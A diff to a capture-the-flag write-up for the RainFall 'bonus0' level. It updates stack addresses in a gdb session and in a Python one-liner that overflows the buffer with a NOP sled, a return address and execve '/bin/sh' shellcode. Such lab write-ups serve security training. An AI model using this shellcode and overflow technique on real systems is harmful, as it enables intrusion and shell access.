@@ -91,7 +91,7 @@ Starting program: /home/user/bonus0/bonus0
 
 Breakpoint 1, 0x08048505 in p ()
 (gdb) x/4c $eax
-0xbfffe650:     52 '4'  50 '2'  52 '4'  50 '2'
+0xbfffe680:     52 '4'  50 '2'  52 '4'  50 '2'
 (gdb) c
 Continuing.
  -
@@ -99,22 +99,22 @@ ABCD
 
 Breakpoint 1, 0x08048505 in p ()
 (gdb) x/4c $eax
-0xbfffe650:     65 'A'  66 'B'  67 'C'  68 'D'
+0xbfffe680:     65 'A'  66 'B'  67 'C'  68 'D'
 ```
 
-0xbfffe650 + 96(0x60) = 0xbfffe6b0
+0xbfffe680 + 96(0x60) = 0xbfffe6e0
 
 96 = 9 + 4 + 83
 
 Solution:
  * (4096) skip first string
  * (09) offset
- * (04) adress of shellcode in buffer [0xbfffe6b0]
+ * (04) adress of shellcode in buffer [0xbfffe6e0]
  * (83) offset until shellcode, 96 - 9 - 4 = 83
  * (45) shellcode
 
 ```
-bonus0@RainFall:~$ python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "\xb0\xe6\xff\xbf" + "\x90" * 83 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"' > /tmp/bonus0 && cat /tmp/bonus0 - | ./bonus0
+bonus0@RainFall:~$ python -c 'print "\x90" * 4095 + "\n" + "\x90" * 9 + "\xe0\xe6\xff\xbf" + "\x90" * 83 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"' > /tmp/bonus0 && cat /tmp/bonus0 - | ./bonus0
  -
  -
 ������������������������������������������� �����������������������
